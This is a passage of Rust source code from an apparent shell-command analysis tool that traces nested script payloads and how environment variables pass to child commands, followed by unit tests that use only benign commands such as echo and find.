                    return matches_canonical_shell(resolved, &command.bindings, &command.command);
                }
                return false;
            }

            for parent in nested_records {
                let NestedPayloadResolution::Parsed { shell_kind, parsed } = &parent.resolution
                else {
                    continue;
                };
                for (command_index, command) in parsed.commands.iter().enumerate() {
                    if derived_invocation_node_id(
                        &request.session_id,
                        request.sequence_no,
                        parent.record_id.0,
                        command_index,
                    ) != *node_id
                    {
                        continue;
                    }
                    let resolved = resolve_invocation_artifact_with_bindings(
                        registry,
                        command,
                        runtime_context_for_parsed_command(parsed, command_index, command),
                        &parent.bindings,
                    );
                    if let ResolveInvocationArtifactResult::Resolved(resolved) = resolved {
                        let _ = shell_kind;
                        return matches_canonical_shell(&resolved, &parent.bindings, command);
                    }
                    return false;
                }
            }
            false
        }
    }
}

fn top_level_recursive_payload_candidates(
    registry: &ProfileRegistry,

    session: SessionView<'_>,
    request: &CheckRequest,
    parsed_request: &caushell_parse::ParsedCommandArtifact,
    command_index: usize,
    bound: &caushell_profile::BoundInvocation,
    bindings: &SessionBindings,
    scope_base_bindings: &SessionBindings,
    max_nested_parse_depth: u8,
) -> Vec<caushell_profile::RecursivePayloadCandidate> {
    recursive_payload_candidates_for_scoped_command(
        registry,
        session,
        request,
        parsed_request,
        command_index,
        bound,
        bindings,
        scope_base_bindings,
        max_nested_parse_depth,
    )
}

fn script_file_payload_candidates_from_prior_literal_writes(
    registry: &ProfileRegistry,

    session: SessionView<'_>,
    request: &CheckRequest,
    parsed_request: &caushell_parse::ParsedCommandArtifact,
    record: &ResolvedCommandSeed,
    resolved: &caushell_profile::ResolvedInvocationArtifact,
    bindings: &SessionBindings,
    scope_base_bindings: &SessionBindings,
    max_nested_parse_depth: u8,
) -> Vec<caushell_profile::RecursivePayloadCandidate> {
    script_file_payload_candidates_from_literal_writes(
        registry,
        session,
        request,
        resolved,
        bindings,
        parsed_request,
        record.command_ref.command_index,
        scope_base_bindings,
        &record.source_node_id,
        max_nested_parse_depth,
        None,
    )
}

fn script_file_payload_candidates_from_literal_writes(
    registry: &ProfileRegistry,

    session: SessionView<'_>,
    request: &CheckRequest,
    resolved: &caushell_profile::ResolvedInvocationArtifact,
    bindings: &SessionBindings,
    parsed_scope: &caushell_parse::ParsedCommandArtifact,
    command_index: usize,
    scope_base_bindings: &SessionBindings,
    history_anchor_node_id: &caushell_graph::NodeId,
    _max_nested_parse_depth: u8,
    source_context: Option<&ProgramSourceContext>,
) -> Vec<caushell_profile::RecursivePayloadCandidate> {
    let Some(language) = script_payload_language(
        resolved.normalized_command_name.as_str(),
        request.shell_kind,
    ) else {
        return Vec::new();
    };

    script_payload_slots(&resolved.bound)
        .into_iter()
        .filter_map(|slot| {
            let parameter = resolved
                .bound
                .bound_parameters
                .iter()
                .find(|parameter| parameter.name == slot)?;
            if !parameter_is_script_source_path(parameter) {
                return None;
            }

            let query_session = caushell_query::QuerySession::from_session(&session);
            let lookup_cwd = source_context.map(|context| {
                source_payload_cwd(
                    registry,
                    request,
                    parsed_scope,
                    command_index,
                    scope_base_bindings,
                    &context.entry_cwd,
                )
            });
            let lookup_base = match lookup_cwd.as_ref() {
                Some(caushell_runner::EffectiveCwd::Known(cwd)) => cwd.as_str(),
                Some(_) => return None,
                None => request.shell_state_before.cwd(),
            };
            let path =
                resolved_parameter_path(parameter, bindings, lookup_base, request.home.as_deref())?;
            // Streams are handled in the shared recursive-payload entry,
            // including an unresolved candidate when their bytes are unknown.
            if path == "/dev/null"
                || caushell_query::IoTargetQuery::descriptor_alias(&path).is_some()
            {
                return None;
            }
            let text = if let Some(context) = source_context {
                let observations = source_scope_observations(
                    registry,
                    request,
                    parsed_scope,
                    command_index,
                    scope_base_bindings,
                );
                let cwds = super::compute_effective_cwd::source_scope_execution_cwds(
                    parsed_scope,
                    request,
                    &context.entry_cwd,
                    &observations,
                )
                .1;
                match source_visible_file_content(
                    registry,
                    session,
                    request,
                    parsed_scope,
                    command_index,
                    &path,
                    &observations,
                    &cwds,
                    &context.source_scopes,
                    None,
                ) {
                    crate::support::StaticFileContent::Known(text) => Some(text),
                    _ => None,
                }
            } else {
                static_known_literal_path_content_before_scoped_command(
                    query_session,
                    parsed_scope,
                    command_index,
                    &path,
                    request.sequence_no,
                    &runtime_binding_replay(registry, request, scope_base_bindings),
                    request.shell_state_before.cwd(),
                    request.home.as_deref(),
                )
                .or_else(|| {
                    static_known_literal_path_content_before_execution_unit(
                        query_session,
                        &path,
                        history_anchor_node_id,
                        request.shell_state_before.cwd(),
                        request.home.as_deref(),
                    )
                })
                .or_else(|| {
                    static_known_literal_path_content_before_sequence(
                        query_session,
                        &path,
                        request.sequence_no,
                        request.shell_state_before.cwd(),
                        request.home.as_deref(),
                    )
                })
            }?;

            Some(caushell_profile::RecursivePayloadCandidate {
                language,
                source: PayloadSource::ScriptFileRef,
                origin: RecursivePayloadOrigin::Parameter { slot },
                input: RecursivePayloadInput::LiteralText { text },
            })
        })
        .collect()
}

fn script_stream_payload_candidates(
    registry: &ProfileRegistry,
    session: caushell_query::QuerySession<'_>,
    request: &CheckRequest,
    parsed_scope: &caushell_parse::ParsedCommandArtifact,
    command_index: usize,
    bound: &caushell_profile::BoundInvocation,
    bindings: &SessionBindings,
    scope_base_bindings: &SessionBindings,
    max_nested_parse_depth: u8,
) -> Vec<RecursivePayloadCandidate> {
    let Some(language) = script_payload_language(bound.command_name.as_str(), request.shell_kind)
    else {
        return Vec::new();
    };
    let cwd = request.shell_state_before.cwd();
    let home = bindings.tilde_home_with_default(request.home.as_deref());
    script_payload_slots(bound)
        .into_iter()
        .filter_map(|slot| {
            let parameter = bound.bound_parameters.iter().find(|p| p.name == slot)?;
            if !parameter_is_script_source_path(parameter) {
                return None;
            }
            let replay = runtime_binding_replay(registry, request, bindings);
            let base_replay = runtime_binding_replay(registry, request, scope_base_bindings);
            let evidence = if let Some(text) = parameter.values.iter().find_map(|value| match value
            {
                BoundValue::Argument {
                    text,
                    node_kind,
                    materialization,
                    ..
                } if node_kind == "process_substitution"
                    && *materialization
                        == caushell_profile::BoundArgumentMaterialization::Literal =>
                {
                    Some(text)
                }
                _ => None,
            }) {
                process_substitution_evidence(
                    session,
                    text,
                    parsed_scope.shell_kind,
                    request.sequence_no,
                    &replay,
                    cwd,
                    !crate::support::scope_has_prior_directory_transition(
                        parsed_scope,
                        command_index,
                    ),
                    home,
                    max_nested_parse_depth,
                )
            } else {
                let path = resolved_parameter_path(parameter, bindings, cwd, home)?;
                if path != "/dev/null"
                    && caushell_query::IoTargetQuery::descriptor_alias(&path).is_none()
                {
                    return None;
                }
                let io = crate::support::content_io_target(
                    parsed_scope,
                    Some(command_index),
                    None,
                    &caushell_types::PathResolution::Concrete { path },
                    false,
                    cwd,
                    home,
                    Some(bindings),
                );
                let evidence = static_io_target_evidence(
                    session,
                    parsed_scope,
                    command_index,
                    &io,
                    request.sequence_no,
                    &replay,
                    &base_replay,
                    cwd,
                    home,
                    max_nested_parse_depth,
                );
                // A descriptor opened on a concrete filesystem pathname retains
                // the existing file-source policy, not a blanket stream gap.
                // Known bytes may still expose concrete nested shell effects.
                if !evidence.complete
                    && matches!(&io, caushell_query::IoTarget::Path { resolution, .. }
                        if resolution.concrete_path().is_some())
                {
                    return None;
                }
                evidence
            };
            Some(RecursivePayloadCandidate {
                language,
                source: PayloadSource::ScriptFileRef,
                origin: RecursivePayloadOrigin::Parameter { slot },
                input: if evidence.complete {
                    RecursivePayloadInput::LiteralText {
                        text: evidence.known_fragments.join(""),
                    }
                } else {
                    RecursivePayloadInput::ImplicitInput {
                        source: caushell_profile::ImplicitInputSource::DispatchOutput,
                        domain: None,
                    }
                },
            })
        })
        .collect()
}

fn script_payload_language(
    normalized_command_name: &str,
    shell_kind: caushell_types::ShellKind,
) -> Option<PayloadLanguage> {
    match normalized_command_name {
        "bash" => Some(PayloadLanguage::Bash),
        "ash" | "dash" | "sh" | "zsh" => Some(PayloadLanguage::Sh),
        "source" | "." => Some(match shell_kind {
            caushell_types::ShellKind::Bash => PayloadLanguage::Bash,
            caushell_types::ShellKind::Sh => PayloadLanguage::Sh,
            caushell_types::ShellKind::Zsh
            | caushell_types::ShellKind::Fish
            | caushell_types::ShellKind::Powershell => PayloadLanguage::Sh,
        }),
        _ => None,
    }
}

fn script_payload_slots(bound: &caushell_profile::BoundInvocation) -> Vec<SlotName> {
    bound
        .effects
        .iter()
        .filter_map(|effect| match (&effect.kind, &effect.target) {
            (
                EffectKind::ExecutePayload | EffectKind::SourceScriptIntoCurrentShell,
                EffectTarget::Slot(slot),
            ) => Some(slot.clone()),
            _ => None,
        })
        .collect()
}

fn parameter_is_script_source_path(parameter: &BoundParameter) -> bool {
    matches!(
        parameter.semantic,
        SemanticType::Path(caushell_profile::PathSemantic {
            role: PathRole::Read,
            purpose: Some(PathPurpose::ScriptSource),
        })
    )
}

fn resolved_parameter_path(
    parameter: &BoundParameter,
    bindings: &SessionBindings,
    cwd: &str,
    home: Option<&str>,
) -> Option<String> {
    let home = bindings.tilde_home_with_default(home);
    for value in &parameter.values {
        let BoundValue::Argument {
            text,
            quoted,
            node_kind,
            materialization,
            ..
        } = value
        else {
            continue;
        };

        let (text, node_kind) = match materialization {
            caushell_profile::BoundArgumentMaterialization::ResolvedExactScalar { .. }
            | caushell_profile::BoundArgumentMaterialization::ResolvedRuntimeProduced { .. } => {
                // The bound bytes are the complete expanded operand. Looking
                // up its provenance variable would lose a composite suffix.
                (text.as_str(), "raw_string")
            }
            caushell_profile::BoundArgumentMaterialization::Literal => {
                (text.as_str(), node_kind.as_str())
            }
            caushell_profile::BoundArgumentMaterialization::RuntimeData => {
                (text.as_str(), "raw_string")
            }
        };

        if let Some(path) = resolve_path_operand(text, *quoted, node_kind, cwd, home) {
            return Some(path);
        }
    }

    None
}

fn recursive_payload_candidates_for_parsed_command(
    _parsed_command: &caushell_parse::ParsedCommandArtifact,
    _command_index: usize,
    bound: &caushell_profile::BoundInvocation,
) -> Vec<caushell_profile::RecursivePayloadCandidate> {
    collect_recursive_payload_candidates(bound)
}

fn recursive_payload_candidates_for_scoped_command(
    registry: &ProfileRegistry,

    session: SessionView<'_>,
    request: &CheckRequest,
    parsed_command: &caushell_parse::ParsedCommandArtifact,
    command_index: usize,
    bound: &caushell_profile::BoundInvocation,
    bindings: &SessionBindings,
    scope_base_bindings: &SessionBindings,
    max_nested_parse_depth: u8,
) -> Vec<caushell_profile::RecursivePayloadCandidate> {
    let mut candidates =
        recursive_payload_candidates_for_parsed_command(parsed_command, command_index, bound);
    rewrite_static_stdin_payload_candidates(
        registry,
        session,
        request,
        parsed_command,
        command_index,
        bindings,
        scope_base_bindings,
        max_nested_parse_depth,
        &mut candidates,
    );
    candidates.extend(script_stream_payload_candidates(
        registry,
        caushell_query::QuerySession::from_session(&session),
        request,
        parsed_command,
        command_index,
        bound,
        bindings,
        scope_base_bindings,
        max_nested_parse_depth,
    ));
    candidates
}

fn rewrite_static_stdin_payload_candidates(
    registry: &ProfileRegistry,

    session: SessionView<'_>,
    request: &CheckRequest,
    parsed_request: &caushell_parse::ParsedCommandArtifact,
    command_index: usize,
    bindings: &SessionBindings,
    scope_base_bindings: &SessionBindings,
    max_nested_parse_depth: u8,
    candidates: &mut [caushell_profile::RecursivePayloadCandidate],
) {
    let evidence = static_stdin_evidence_for_scoped_command(
        caushell_query::QuerySession::from_session(&session),
        parsed_request,
        command_index,
        request.sequence_no,
        &runtime_binding_replay(registry, request, bindings),
        &runtime_binding_replay(registry, request, scope_base_bindings),
        request.shell_state_before.cwd(),
        true,
        request.home.as_deref(),
        max_nested_parse_depth,
    );
    let Some(text) = evidence.complete_text() else {
        return;
    };

    for candidate in candidates.iter_mut() {
        let caushell_profile::RecursivePayloadInput::ImplicitInput { source, .. } =
            &candidate.input
        else {
            continue;
        };
        if *source != caushell_profile::ImplicitInputSource::StdinPayload {
            continue;
        }

        candidate.input =
            caushell_profile::RecursivePayloadInput::LiteralText { text: text.clone() };
    }
}

struct FrontierEntry {
    parent_ref: NestedPayloadParentRef,
    root_command_index: usize,
    depth: u8,
    candidate: caushell_profile::RecursivePayloadCandidate,
    bindings: SessionBindings,
    positional_args: Option<Vec<caushell_profile::ProjectedArg>>,
    scope_entry_cwd: caushell_runner::EffectiveCwd,
    source_scopes: Vec<PayloadSourceScope>,
}

#[derive(Clone)]
struct PayloadSourceScope {
    parsed: std::sync::Arc<caushell_parse::ParsedCommandArtifact>,
    before_command_index: usize,
    bindings: SessionBindings,
    entry_cwd: caushell_runner::EffectiveCwd,
}

fn extended_payload_source_scopes(
    ancestors: &[PayloadSourceScope],
    parsed: &caushell_parse::ParsedCommandArtifact,
    before_command_index: usize,
    bindings: &SessionBindings,
    entry_cwd: &caushell_runner::EffectiveCwd,
) -> Vec<PayloadSourceScope> {
    let mut scopes = ancestors.to_vec();
    scopes.push(PayloadSourceScope {
        parsed: std::sync::Arc::new(parsed.clone()),
        before_command_index,
        bindings: bindings.clone(),
        entry_cwd: entry_cwd.clone(),
    });
    scopes
}

fn collect_child_frontier_entries(
    registry: &ProfileRegistry,
    session: SessionView<'_>,
    request: &CheckRequest,
    parsed: &caushell_parse::ParsedCommandArtifact,
    parent_bindings: &SessionBindings,
    scope_entry_cwd: &caushell_runner::EffectiveCwd,
    source_scopes: &[PayloadSourceScope],
    parent_record_id: NestedPayloadRecordId,
    root_command_index: usize,
    depth: u8,
    max_nested_parse_depth: u8,
) -> Vec<FrontierEntry> {
    let mut entries = Vec::new();

    for (derived_command_index, command) in parsed.commands.iter().enumerate() {
        let command_bindings = apply_runtime_variable_bindings_before_span(
            registry,
            request,
            parent_bindings.clone(),
            parsed,
            command.span.start_byte,
            request.sequence_no,
        );
        let resolved = resolve_invocation_artifact_with_bindings(
            registry,
            command,
            InvocationRuntimeContext::new(),
            &command_bindings,
        );

        let ResolveInvocationArtifactResult::Resolved(resolved) = resolved else {
            continue;
        };

        for child_candidate in recursive_payload_candidates_for_scoped_command(
            registry,
            session,
            request,
            parsed,
            derived_command_index,
            &resolved.bound,
            &command_bindings,
            parent_bindings,
            max_nested_parse_depth,
        ) {
            entries.push(FrontierEntry {
                parent_ref: NestedPayloadParentRef::DerivedInvocation {
                    node_id: derived_invocation_node_id(
                        &request.session_id,
                        request.sequence_no,
                        parent_record_id.0,
                        derived_command_index,
                    ),
                },
                root_command_index,
                depth,
                candidate: child_candidate,
                bindings: command_bindings.clone(),
                positional_args: shell_dispatch_positional_arguments(command),
                scope_entry_cwd: source_payload_cwd(
                    registry,
                    request,
                    parsed,
                    derived_command_index,
                    parent_bindings,
                    scope_entry_cwd,
                ),
                source_scopes: extended_payload_source_scopes(
                    source_scopes,
                    parsed,
                    derived_command_index,
                    parent_bindings,
                    scope_entry_cwd,
                ),
            });
        }
    }

    entries
}

#[cfg(test)]
mod tests {
    use std::{collections::BTreeSet, path::PathBuf};

    use super::ResolveInvocationPass;

    #[test]
    fn exact_positional_prebinding_uses_shared_shell_reference_grammar() {
        for (text, index) in [("$1", 1), ("${10}", 10), ("${00}", 0)] {
            assert_eq!(
                super::exact_shell_positional_reference(text, "string"),
                Some(index)
            );
            assert_eq!(
                super::exact_shell_positional_reference(text, "raw_string"),
                None
            );
            assert_eq!(
                super::exact_shell_positional_reference(text, "ansi_c_string"),
                None
            );
        }
        for text in ["$10", "$00", "$99", "${1}0", "$name", r"\$10"] {
            assert_eq!(
                super::exact_shell_positional_reference(text, "string"),
                None,
                "{text}"
            );
        }
    }
    use crate::{ParseCommandPass, ProjectTopLevelCommandsPass};
    use caushell_graph::{Edge, EdgeKind, GraphNode};
    use caushell_graph::{NodeId, SessionGraph};
    use caushell_profile::{
        BoundInvocation, BoundValue, ProfileRegistry, ResolveInvocationArtifactResult,
        ValueMaterialization,
    };
    use caushell_runner::{
        ExecutionUnitOriginKind, ExecutionUnitOriginLocator, NestedPayloadParentRef,
        NestedPayloadResolution, PassRunner, PendingMutation, RunnerContext, SessionView,
    };
    use caushell_types::{
        CheckRequest, CommandSequenceNo, DerivedInvocationOrigin, EvidenceKind,
        NestedPayloadOriginEvidence, NestedPayloadParentEvidence,
        NestedPayloadUnresolvedReasonEvidence, PolicyConfig, ProvenanceArtifact,
        ProvenanceDomainLabel, ProvenanceEdgeSemantics, ProvenanceProduceKind, ResolvedPathPurpose,
        ResolvedPathRole, RuleId, RuntimeMetadata, SessionFunctionBinding, SessionId,
        SessionSummary, ShellKind,
    };

    fn sample_request(shell_kind: ShellKind, command: &str) -> CheckRequest {
        CheckRequest {
            session_id: SessionId::new("sess-1"),
            sequence_no: CommandSequenceNo::new(2),
            command: command.to_string(),
            shell_state_before: caushell_types::ShellStateSnapshot::new("/tmp/project".to_string()),
            shell_kind,
            runtime: RuntimeMetadata {
                runtime_name: "claude_code".to_string(),
                tool_name: Some("Bash".to_string()),
                shell_runtime_capabilities:
                    caushell_types::ShellRuntimeCapabilities::persistent_shell(),
            },
            home: Some("/home/alice".to_string()),
            workspace_root: Some("/tmp/project".to_string()),
        }
    }

    fn built_in_registry() -> ProfileRegistry {
        let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
        let profiles_dir = manifest_dir.join("../caushell-profile/profiles");

        ProfileRegistry::load_dir(&profiles_dir)
            .expect("expected built-in profiles directory to load")
    }

    #[test]
    fn multi_action_dispatch_authority_known_regions_agree_across_consumers() {
        let ctx = run_pass(&SessionSummary::new(), ShellKind::Bash,
            r"find . -exec echo {} \; -exec true {} \; -execdir printf %s {} \;");
        let parent = top_level_record(&ctx, 0);
        assert!(ctx.unresolved_dispatch_records().is_empty(), "{:?}", ctx.unresolved_dispatch_records());
        assert!(super::complete_native_dispatch_nodes(&ctx).contains(&parent.source_node_id.0));
        let indices: std::collections::BTreeSet<_> = ctx.execution_unit_resolve_records().iter()
            .filter(|r| r.parent_execution_node_id == parent.source_node_id
                && r.origin_kind == caushell_runner::ExecutionUnitOriginKind::Dispatch)
            .map(|r| r.origin_index).collect();
        assert_eq!(indices, [0, 1, 2].into_iter().collect());
    }

    #[test]
    fn multi_action_dispatch_authority_unknown_region_keeps_its_own_identity() {
        let ctx = run_pass(&SessionSummary::new(), ShellKind::Bash,
            r#"find . -exec echo {} \; -exec "$UNKNOWN" {} \; -exec true {} \;"#);
        let parent = top_level_record(&ctx, 0);
        let gaps = ctx.unresolved_dispatch_records();
        assert_eq!(gaps.len(), 1, "{gaps:?}");
        assert_eq!(gaps[0].dispatch_index, 1);
        assert!(!super::complete_native_dispatch_nodes(&ctx).contains(&parent.source_node_id.0));
    }

    #[test]
    fn multi_action_dispatch_authority_budget_counts_real_child_regions() {
        let mut policy = PolicyConfig::default();
        policy.semantic_expansion.max_nested_parse_depth = 0;
        let ctx = run_pass_with_policy(&SessionSummary::new(), ShellKind::Bash,
            r"find . -exec echo {} \; -exec true {} \;", policy);
        let parent = top_level_record(&ctx, 0);
        assert!(!super::complete_native_dispatch_nodes(&ctx).contains(&parent.source_node_id.0));
        assert!(ctx.evidence.iter().any(|e| matches!(&e.kind,
            EvidenceKind::ExecutionExpansionTruncated(t) if t.next_candidate_count == 2
        )), "{:?}", ctx.evidence);
    }

    #[test]
    fn multi_action_dispatch_authority_reparse_discards_previous_partition() {
        let mut ctx = run_pass(&SessionSummary::new(), ShellKind::Bash,
            r"find . -exec echo {} \; -exec true {} \;");
        assert!(!ctx.dispatch_projection_records().is_empty());
        ctx.set_parsed_command(caushell_parse::parse_command("echo new", ShellKind::Bash).unwrap());
        assert!(ctx.dispatch_projection_records().is_empty());
        assert!(ctx.unresolved_dispatch_records().is_empty());
        assert!(super::complete_native_dispatch_nodes(&ctx).is_empty());
    }

    #[test]
    fn multi_action_dispatch_authority_incomplete_parent_cannot_claim_coverage() {
        for command in [
            r"find . -exec echo {} \; -exec",
            r"find . -exec echo {} \; -exec true {}",
            r#"find . -exec echo {} \; -exec "$UNKNOWN" {} \;"#,
        ] {
            let ctx = run_pass(&SessionSummary::new(), ShellKind::Bash, command);
            let parent = top_level_record(&ctx, 0);
            assert!(!super::complete_native_dispatch_nodes(&ctx).contains(&parent.source_node_id.0),
                "{command}: {:?}", ctx.dispatch_projection_records());
        }
    }

    // This fixture exercises the shared consumer, independently of any tool
    // profile or command-name-specific dispatch behavior.
    fn projected_dispatch_fixture() -> (
        caushell_profile::DispatchCommandCandidate,
        caushell_parse::CommandFact,
    ) {
        let command = caushell_parse::parse_command("echo ok", ShellKind::Bash)
            .unwrap()
            .commands
            .remove(0);
        let child = caushell_profile::DispatchCommandCandidate {
            lookup_domain: caushell_profile::CommandLookupDomain::External,
            dispatch_index: 0,
            command: caushell_profile::DispatchArgument {
                slot: caushell_profile::SlotName::new("child"),
                text: "echo".into(),
                implicit_input_source: None,
                runtime_argument_domain: None,
                runtime_data: true,
                quoted: false,
                node_kind: "word".into(),
                span: command.span.clone(),
                binding_source: caushell_profile::ArgumentBindingSource::RemainingArg,
            },
            argv: Vec::new(),
            environment: Vec::new(),
            unset_environment: Vec::new(),
            clear_environment: false,
            unknown_environment: false,
            unknown_environment_from: Vec::new(),
            unknown_environment_names: Vec::new(),
            generated_environment: Vec::new(),
            working_directory: caushell_profile::DispatchWorkingDirectory::Inherit,
            stdin_from_parent: false,
            stdin_from_tool: false,
            stdout_to_parent: false,
        };
        (child, command)
    }

    fn projected_dispatch_env_argument(
        child: &caushell_profile::DispatchCommandCandidate,
        text: &str,
        unknown: bool,
    ) -> caushell_profile::DispatchArgument {
        let mut argument = child.command.clone();
        argument.slot = caushell_profile::SlotName::new("environment");
        argument.text = text.into();
        argument.runtime_data = !unknown;
        if unknown {
            argument.implicit_input_source =
                Some(caushell_types::ImplicitInputSource::DispatchOutput);
            argument.runtime_argument_domain =
                Some(caushell_types::RuntimeArgumentDomain::Unbounded);
        }
        argument
    }

    #[test]
    fn projected_dispatch_environment_literal_values_and_parent_isolation() {
        let mut parent = caushell_profile::SessionBindings::new()
            .with_exact_scalar("OUT", "/opt/not-the-child-value");
        parent.export("OUT");
        let (mut candidate, command) = projected_dispatch_fixture();
        candidate.environment = vec![projected_dispatch_env_argument(
            &candidate,
            "TARGET=$OUT",
            false,
        )];
        let child = super::dispatch_child_session_bindings(&parent, &candidate, &command);
        assert!(matches!(child.environment_value("TARGET"),
            caushell_profile::EnvironmentValueRef::Present(caushell_profile::SessionValue::ExactScalar(v)) if v == "$OUT"));
        assert!(matches!(
            parent.environment_value("TARGET"),
            caushell_profile::EnvironmentValueRef::Unknown
        ));
        assert_eq!(
            parent.environment_value("OUT"),
            child.environment_value("OUT")
        );
    }

    #[test]
    fn projected_dispatch_environment_unknown_overlay_dominates_known_values() {
        for clear in [false, true] {
            for unknown_first in [false, true] {
                let mut parent = caushell_profile::SessionBindings::new()
                    .with_exact_scalar("TARGET", "/tmp/project/safe");
                parent.export("TARGET");
                let (mut candidate, command) = projected_dispatch_fixture();
                candidate.clear_environment = clear;
                let known = projected_dispatch_env_argument(
                    &candidate,
                    "TARGET=/tmp/project/also-safe",
                    false,
                );
                let unknown = projected_dispatch_env_argument(&candidate, "", true);
                candidate.environment = if unknown_first {
                    vec![unknown, known]
                } else {
                    vec![known, unknown]
                };
                let child = super::dispatch_child_session_bindings(&parent, &candidate, &command);
                assert!(matches!(
                    child.environment_value("TARGET"),
                    caushell_profile::EnvironmentValueRef::Unknown
                ));
                assert!(child.get("TARGET").is_none());
                assert!(matches!(
                    child.environment_value("OTHER"),
                    caushell_profile::EnvironmentValueRef::Unknown
                ));
                assert!(matches!(
                    parent.environment_value("TARGET"),
                    caushell_profile::EnvironmentValueRef::Present(_)
                ));
            }
        }
    }

    #[test]
    fn projected_dispatch_environment_known_unset_removes_only_child_binding() {
        let mut parent =
            caushell_profile::SessionBindings::new().with_exact_scalar("TARGET", "value");
        parent.export("TARGET");
        let (mut candidate, command) = projected_dispatch_fixture();
        candidate.unset_environment =
            vec![projected_dispatch_env_argument(&candidate, "TARGET", false)];
        let child = super::dispatch_child_session_bindings(&parent, &candidate, &command);
        assert!(matches!(
            child.environment_value("TARGET"),
            caushell_profile::EnvironmentValueRef::Absent
        ));
        assert!(child.get("TARGET").is_none());
        assert!(matches!(
            parent.environment_value("TARGET"),
            caushell_profile::EnvironmentValueRef::Present(_)
        ));
    }

    #[test]
    fn declarative_environment_removal_preserves_unrelated_unknowns_and_parent() {
        let yaml = r#"
dsl_version: caushell.profile/v1alpha1
kind: command_profile
identity: {canonical_name: omit-fixture}
option_scope: leading_options
forms:
  - id: run
    effects:
      - kind: dispatch_command
        target: {kind: dispatch, command_literal: child-fixture, unset_environment_when: [{modifier: omit, names: [FIXTURE_CACHE]}]}
modifiers:
  - {id: omit, matcher: {kind: any_flag, flags: [--omit]}}
"#;
        let registry = caushell_profile::ProfileRegistry::from_profiles(vec![
            caushell_profile::load_command_profile_from_str(yaml).unwrap(),
        ])
        .unwrap();
        let command =
            caushell_parse::parse_command("omit-fixture --omit", caushell_types::ShellKind::Bash)
                .unwrap()
                .commands
                .remove(0);
        let caushell_profile::ResolveInvocationResult::Resolved(r) =
            caushell_profile::resolve_invocation(
                &registry,
                &command,
                caushell_profile::InvocationRuntimeContext::new(),
            )
        else {
            panic!()
        };
        let candidate = caushell_profile::collect_dispatch_command_candidates(&r.bound).remove(0);
        let mut parent = caushell_profile::SessionBindings::new()
            .with_exact_scalar("FIXTURE_CACHE", "/outside")
            .with_exact_scalar("OTHER", "preserved");
        parent.export("FIXTURE_CACHE");
        parent.export("OTHER");
        let untouched = parent.clone();
        let child = super::dispatch_child_session_bindings(&parent, &candidate, &command);
        assert!(matches!(
            child.environment_value("FIXTURE_CACHE"),
            caushell_profile::EnvironmentValueRef::Absent
        ));
        assert!(matches!(
            child.environment_value("OTHER"),
            caushell_profile::EnvironmentValueRef::Present(_)
        ));
        assert!(matches!(
            child.environment_value("UNKNOWN"),
            caushell_profile::EnvironmentValueRef::Unknown
        ));
        assert_eq!(parent, untouched);
    }

    #[test]
    fn projected_dispatch_environment_unknown_unset_does_not_become_absent() {
        let parent = caushell_profile::SessionBindings::new();
        let (mut candidate, command) = projected_dispatch_fixture();
        candidate.clear_environment = true;
        candidate.unset_environment = vec![projected_dispatch_env_argument(&candidate, "", true)];
        let child = super::dispatch_child_session_bindings(&parent, &candidate, &command);
        assert!(matches!(
            child.environment_value("TARGET"),
            caushell_profile::EnvironmentValueRef::Unknown
        ));

        // An explicit assignment after an unset is still a known value.
        candidate.environment = vec![projected_dispatch_env_argument(
            &candidate,
            "TARGET=after-unset",
            false,
        )];
        let child = super::dispatch_child_session_bindings(&parent, &candidate, &command);
        assert!(matches!(child.environment_value("TARGET"),
            caushell_profile::EnvironmentValueRef::Present(caushell_profile::SessionValue::ExactScalar(v)) if v == "after-unset"));
    }

    #[test]
    fn projected_dispatch_environment_clear_keeps_explicit_known_assignments() {
        let parent =
            caushell_profile::SessionBindings::new().with_exact_scalar("PARENT_ONLY", "old");
        let (mut candidate, command) = projected_dispatch_fixture();
        candidate.clear_environment = true;
        candidate.environment = vec![projected_dispatch_env_argument(
            &candidate,
            "TARGET=child",
            false,
        )];
        let child = super::dispatch_child_session_bindings(&parent, &candidate, &command);
        assert!(matches!(
            child.environment_value("PARENT_ONLY"),
            caushell_profile::EnvironmentValueRef::Absent
        ));
        assert!(matches!(
            child.environment_value("TARGET"),
            caushell_profile::EnvironmentValueRef::Present(_)
        ));
        assert!(parent.get("PARENT_ONLY").is_some());
    }

    #[test]
    fn projected_dispatch_environment_original_words_keep_legacy_materialization() {
        let parent =
            caushell_profile::SessionBindings::new().with_exact_scalar("SOURCE", "original-value");
        let (mut candidate, command) = projected_dispatch_fixture();
        let mut argument = projected_dispatch_env_argument(&candidate, "TARGET=$SOURCE", false);
        argument.runtime_data = false;
        candidate.environment = vec![argument];
        let child = super::dispatch_child_session_bindings(&parent, &candidate, &command);
        assert!(matches!(child.environment_value("TARGET"),
            caushell_profile::EnvironmentValueRef::Present(caushell_profile::SessionValue::ExactScalar(v)) if v == "original-value"));
    }

    fn first_argument_text<'a>(invocation: &'a BoundInvocation, slot_name: &str) -> &'a str {
        let parameter = invocation
            .bound_parameters
            .iter()
            .find(|parameter| parameter.name.as_str() == slot_name)
            .expect("expected bound parameter to exist");

        match &parameter.values[0] {
            BoundValue::Argument { text, .. } => text.as_str(),
            other => panic!("expected argument bound value, got {other:?}"),
        }
    }

    fn top_level_record(
        ctx: &RunnerContext,
        command_index: usize,
    ) -> &caushell_runner::ExecutionUnitResolveRecord {
        ctx.execution_unit_resolve_records()
            .iter()
            .find(|record| {
                record.origin_kind == caushell_runner::ExecutionUnitOriginKind::TopLevel
                    && record.command_ref.command_index == command_index
            })
            .expect("expected top-level resolve record")
    }

    fn execution_record_matches_fixture(
        record: &caushell_runner::ExecutionUnitResolveRecord,
        fixture: &str,
    ) -> bool {
        let parsed = caushell_parse::parse_command(fixture, ShellKind::Sh).unwrap();
        assert_eq!(parsed.commands.len(), 1);
        let command = &parsed.commands[0];
        let arguments = command
            .tokens
            .iter()
            .map(|token| {
                caushell_parse::decode_static_shell_argument(
                    &token.text,
                    token.quoted,
                    &token.node_kind,
                )
                .expect("fixture argv must be statically decoded")
            })
            .collect::<Vec<_>>();
        execution_record_has_argv(
            record,
            command.command_name.as_deref().unwrap(),
            &arguments.iter().map(String::as_str).collect::<Vec<_>>(),
        )
    }

    fn execution_record_has_argv(
        record: &caushell_runner::ExecutionUnitResolveRecord,
        command_name: &str,
        arguments: &[&str],
    ) -> bool {
        let Some(command) = record
            .parsed_scope
            .commands
            .get(record.command_ref.command_index)
        else {
            return false;
        };
        command.command_name.as_deref() == Some(command_name)
            && command.tokens.len() == arguments.len()
            && command
                .tokens
                .iter()
                .zip(arguments)
                .all(|(token, expected)| token.text == *expected)
    }
